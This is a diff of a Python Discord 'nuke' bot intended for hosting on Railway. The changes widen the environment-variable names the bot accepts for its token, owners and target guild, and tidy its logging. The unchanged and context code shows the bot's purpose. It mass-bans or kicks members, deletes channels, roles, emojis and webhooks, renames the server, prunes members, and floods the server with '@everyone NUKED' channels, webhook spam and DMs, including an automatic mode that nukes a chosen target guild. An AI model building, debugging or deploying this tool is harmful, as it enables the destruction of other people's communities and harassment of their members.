@@ -1,5 +1,5 @@
 # language: Python 3.11+, file: bot.py, target: Discord + Railway
-# Nuke bot — max tolerant boot
+# Nuke bot — accepts every common env var name
 
 from __future__ import annotations
 
@@ -25,15 +25,21 @@ logging.basicConfig(
 )
 log = logging.getLogger("nuke")
 
-def env_str(key: str, default: str = "") -> str:
-    v = os.getenv(key)
-    if v is None:
-        return default
+def clean(v: Optional[str]) -> str:
+    if not v:
+        return ""
     v = v.strip()
-    # Railway users often paste "token" with quotes
-    if len(v) >= 2 and ((v[0] == v[-1] == '"') or (v[0] == v[-1] == "'")):
+    if len(v) >= 2 and v[0] == v[-1] and v[0] in ("'\""):
         v = v[1:-1].strip()
     return v
+
+def first_env(*keys: str, default: str = "") -> str:
+    for k in keys:
+        val = clean(os.getenv(k))
+        if val:
+            log.info("Using env %s (len=%s)", k, len(val))
+            return val
+    return default
 
 def env_bool(key: str, default: bool = False) -> bool:
     v = (os.getenv(key) or str(default)).strip().lower()
@@ -51,26 +57,45 @@ def env_float(key: str, default: float = 0.0) -> float:
     except ValueError:
         return default
 
-def env_ids(key: str) -> set[int]:
-    raw = env_str(key)
+def parse_ids(raw: str) -> set[int]:
     out: set[int] = set()
     for part in raw.replace(" ", "").split(","):
         if part.isdigit():
             out.add(int(part))
     return out
 
-# Accept TOKEN or DISCORD_TOKEN
-TOKEN = env_str("TOKEN") or env_str("DISCORD_TOKEN")
-OWNER_IDS = env_ids("OWNER_IDS") or env_ids("OWNER_ID")
-PREFIX = env_str("PREFIX", "!") or "!"
+# ── TOKEN : tous les noms possibles ──
+TOKEN = first_env(
+    "TOKEN",
+    "DISCORD_TOKEN",
+    "BOT_TOKEN",
+    "DISCORD_BOT_TOKEN",
+    "CLIENT_TOKEN",
+    "NUKE_TOKEN",
+    "DISCORD_BOT",
+)
+
+# ── OWNERS ──
+OWNER_RAW = first_env(
+    "OWNER_IDS",
+    "OWNER_ID",
+    "OWNERS",
+    "BOT_OWNER",
+    "OWNER",
+    "ADMIN_IDS",
+    "ADMIN_ID",
+)
+OWNER_IDS = parse_ids(OWNER_RAW)
+
+PREFIX = first_env("PREFIX", "BOT_PREFIX", default="!") or "!"
 PORT = env_int("PORT", 8080)
 
-NUKE_NAME = env_str("NUKE_NAME", "NUKED") or "NUKED"
+NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
 SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
 SPAM_MESSAGES = max(0, env_int("SPAM_MESSAGES", 15))
-SPAM_TEXT = env_str("SPAM_TEXT", "@everyone NUKED") or "@everyone NUKED"
+SPAM_TEXT = first_env("SPAM_TEXT", default="@everyone NUKED") or "@everyone NUKED"
 WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
-BAN_REASON = env_str("BAN_REASON", "nuked") or "nuked"
+BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
 DELETE_ROLES = env_bool("DELETE_ROLES", True)
 DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
 DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
@@ -80,28 +105,31 @@ KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
 SKIP_BOTS = env_bool("SKIP_BOTS", False)
 SKIP_OWNER = env_bool("SKIP_OWNER", True)
 CHANGE_ICON = env_bool("CHANGE_ICON", False)
-ICON_URL = env_str("ICON_URL")
+ICON_URL = first_env("ICON_URL")
 CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
-BANNER_URL = env_str("BANNER_URL")
+BANNER_URL = first_env("BANNER_URL")
 CREATE_ROLES = max(0, env_int("CREATE_ROLES", 10))
-ROLE_NAME = env_str("ROLE_NAME", "nuked") or "nuked"
-CHANNEL_NAME = env_str("CHANNEL_NAME", "nuked") or "nuked"
+ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
+CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
 CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 5))
 CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
-DM_MESSAGE = env_str("DM_MESSAGE")
-LOG_WEBHOOK = env_str("LOG_WEBHOOK")
-AUTO_NUKE_GUILD = env_str("AUTO_NUKE_GUILD")
+DM_MESSAGE = first_env("DM_MESSAGE")
+LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
+AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
 CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
 RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.2))
 PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
-VANITY = env_str("VANITY")
+VANITY = first_env("VANITY")
 KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))
 
 log.info("=== NUKE BOT BOOT ===")
 log.info("python=%s", sys.version.split()[0])
-log.info("PORT=%s", PORT)
-log.info("TOKEN present=%s length=%s prefix=%s", bool(TOKEN), len(TOKEN), (TOKEN[:8] + "…") if len(TOKEN) > 8 else TOKEN)
-log.info("OWNER_IDS=%s", OWNER_IDS or "(empty — commands disabled)")
+# Dump all env KEY names (not values) so we see what Railway injected
+keys = sorted(os.environ.keys())
+log.info("ENV KEYS (%s): %s", len(keys), ", ".join(keys))
+log.info("PORT=%s PREFIX=%s", PORT, PREFIX)
+log.info("TOKEN found=%s len=%s head=%s", bool(TOKEN), len(TOKEN), (TOKEN[:6] + "…") if TOKEN else "-")
+log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")
 
 intents = discord.Intents.none()
 intents.guilds = True
@@ -125,7 +153,7 @@ _bot_ready = False
 def owner_only():
     async def pred(ctx: commands.Context) -> bool:
         if not OWNER_IDS:
-            await ctx.send("OWNER_IDS manquant sur Railway.")
+            await ctx.send("OWNER_IDS manquant.")
             return False
         return ctx.author.id in OWNER_IDS
     return commands.check(pred)
@@ -193,15 +221,7 @@ async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
 async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
     me, owner = guild.me, guild.owner
     members = await fetch_members(guild)
-    targets = []
-    for m in members:
-        if me and m.id == me.id:
-            continue
-        if SKIP_OWNER and owner and m.id == owner.id:
-            continue
-        if SKIP_BOTS and m.bot:
-            continue
-        targets.append(m)
+    targets = [m for m in members if not (me and m.id == me.id) and not (SKIP_OWNER and owner and m.id == owner.id) and not (SKIP_BOTS and m.bot)]
 
     async def one(m: discord.Member):
         if DM_MESSAGE:
@@ -392,36 +412,25 @@ async def full_nuke(guild: discord.Guild):
         n = await action_ban_all(guild, kick=KICK_INSTEAD)
         await say(f"[+] Ban/Kick: {n}")
     if PRUNE_DAYS > 0:
-        n = await action_prune(guild, PRUNE_DAYS)
-        await say(f"[+] Prune: {n}")
+        await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
     if DELETE_WEBHOOKS:
-        n = await action_delete_webhooks(guild)
-        await say(f"[+] Webhooks: {n}")
-    n = await action_delete_channels(guild)
-    await say(f"[+] Channels deleted: {n}")
+        await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
+    await say(f"[+] Channels deleted: {await action_delete_channels(guild)}")
     if DELETE_ROLES:
-        n = await action_delete_roles(guild)
-        await say(f"[+] Roles deleted: {n}")
+        await say(f"[+] Roles deleted: {await action_delete_roles(guild)}")
     if DELETE_EMOJIS:
-        n = await action_delete_emojis(guild)
-        await say(f"[+] Emojis: {n}")
+        await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
     if DELETE_STICKERS:
-        n = await action_delete_stickers(guild)
-        await say(f"[+] Stickers: {n}")
-    ok = await action_rename(guild, NUKE_NAME)
-    await say(f"[+] Rename: {ok}")
+        await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
+    await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
     if VANITY:
-        ok = await action_vanity(guild, VANITY)
-        await say(f"[+] Vanity: {ok}")
+        await say(f"[+] Vanity: {await action_vanity(guild, VANITY)}")
     if CREATE_ROLES:
-        n = await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)
-        await say(f"[+] Roles created: {n}")
+        await say(f"[+] Roles created: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
     if CREATE_CATEGORIES:
-        n = await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)
-        await say(f"[+] Categories: {n}")
+        await say(f"[+] Categories: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
     if CREATE_VOICE:
-        n = await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)
-        await say(f"[+] Voice: {n}")
+        await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
     channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
     await say(f"[+] Text channels: {len(channels)}")
     if channels and SPAM_MESSAGES > 0:
@@ -433,8 +442,7 @@ async def full_nuke(guild: discord.Guild):
     await say("[*] NUKE COMPLETE")
 
 async def health_handler(_request):
-    body = "online" if _bot_ready else "starting"
-    return web.Response(text=body, status=200)
+    return web.Response(text="online" if _bot_ready else "starting", status=200)
 
 async def start_health_server():
     app = web.Application()
@@ -589,12 +597,13 @@ async def cmd_status(ctx: commands.Context):
 @bot.command(name="helpnuke")
 @owner_only()
 async def cmd_help(ctx: commands.Context):
-    await ctx.send(f"`{PREFIX}nuke banall kickall delchannels delroles delemojis spam webhookspam rename dmall prune vanity leave guilds status`")
+    await ctx.send(f"`{PREFIX}nuke banall kickall delchannels delroles delemojis spam rename dmall leave guilds status`")
 
 async def runner():
     await start_health_server()
     if not TOKEN:
-        log.error("NO TOKEN — set Railway var TOKEN (or DISCORD_TOKEN)")
+        log.error("NO TOKEN in any of: TOKEN DISCORD_TOKEN BOT_TOKEN DISCORD_BOT_TOKEN CLIENT_TOKEN NUKE_TOKEN")
+        log.error("Add one of these on Railway → Variables (shared or service), then Redeploy")
         while True:
             await asyncio.sleep(3600)
         return
@@ -603,7 +612,7 @@ async def runner():
         async with bot:
             await bot.start(TOKEN, reconnect=True)
     except discord.LoginFailure:
-        log.error("LOGIN FAILED — token invalid or revoked. Regenerate token on Discord Developer Portal.")
+        log.error("LOGIN FAILED — token invalid/revoked. Reset token on Discord Developer Portal.")
         while True:
             await asyncio.sleep(3600)
     except Exception:
